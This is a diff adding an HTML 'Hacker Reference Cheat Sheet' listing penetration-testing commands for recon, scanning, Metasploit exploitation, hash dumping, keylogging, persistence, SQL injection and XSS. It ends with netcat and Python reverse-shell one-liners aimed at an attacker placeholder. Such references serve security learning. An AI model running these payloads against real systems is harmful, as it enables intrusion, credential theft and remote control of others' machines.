@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Reference Cheat Sheet</title>
+    <style>
+        /* Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Base Styles */
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #0f0f0f;
+            color: #00ff00;
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        h1, h2, h3 {
+            color: #00ff00;
+            text-align: center;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 5px #000;
+        }
+
+        p, li, blockquote, th, td {
+            color: #00ff00;
+        }
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        a:hover {
+            color: #00ffaa;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #00ff88;
+            margin: 20px 0;
+        }
+
+        /* Code Blocks */
+        code, pre {
+            background: #1a1a1a;
+            color: #00ffaa;
+            padding: 10px;
+            border-radius: 5px;
+            display: block;
+            overflow-x: auto;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 20px;
+            padding-left: 40px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            margin: 20px 0;
+            border-collapse: collapse;
+            background: #1a1a1a;
+            border-radius: 5px;
+        }
+
+        th, td {
+            padding: 10px;
+            border: 1px solid #00ffaa;
+            text-align: left;
+        }
+
+        th {
+            background: #00ff88;
+        }
+
+        /* Highlighting */
+        mark {
+            background: #ffaa00;
+            color: #000;
+        }
+
+        /* Blockquotes */
+        blockquote {
+            border-left: 4px solid #00ff88;
+            padding-left: 20px;
+            font-style: italic;
+            margin: 20px 0;
+            background: #1a1a1a;
+        }
+
+        /* Sections */
+        .section {
+            margin-bottom: 40px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>Hacker Reference Cheat Sheet</h1>
+    <p>An essential guide for penetration testing, recon, and exploitation techniques.</p>
+    <hr>
+
+    <div class="section">
+        <h2>1. Reconnaissance</h2>
+        <pre><code># Scan a network with Nmap
+nmap -sS -Pn -A [target_ip]
+
+# Passive DNS lookup
+whois [domain_name]
+
+dig [domain_name]
+
+# Enumerate subdomains
+sublist3r -d [domain_name]
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>2. Vulnerability Scanning</h2>
+        <pre><code># OpenVAS
+openvas-start
+
+# Nikto web vulnerability scanner
+nikto -h [target_url]
+
+# OWASP ZAP
+zap.sh
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>3. Exploitation</h2>
+        <pre><code># Metasploit Framework
+msfconsole
+
+# Search for exploits
+search exploit [keyword]
+
+# Launch an exploit
+use [exploit_path]
+set payload [payload_name]
+set RHOST [target_ip]
+set LHOST [local_ip]
+exploit
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>4. Post-Exploitation</h2>
+        <pre><code># Dump password hashes
+hashdump
+
+# Capture keystrokes
+keyscan_start
+
+# Establish persistence
+use persistence
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>5. Web Hacking</h2>
+        <pre><code># SQLMap for SQL Injection
+sqlmap -u [target_url] --dbs
+
+# Cross-Site Scripting payloads
+<script>alert('XSS');</script>
+
+# Burp Suite for proxy and interception
+burpsuite
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>6. Useful Payloads</h2>
+        <pre><code># Netcat reverse shell
+nc -e /bin/bash [attacker_ip] [port]
+
+# Python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"]);'
+</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>7. Debugging Tips</h2>
+        <blockquote>
+            "The quieter you become, the more you are able to hear." - Ram Dass
+        </blockquote>
+        <ul>
+            <li>Analyze logs for unusual activity.</li>
+            <li>Use tools like Wireshark for packet analysis.</li>
+            <li>Test exploits in controlled environments.</li>
+        </ul>
+    </div>
+</body>
+</html>
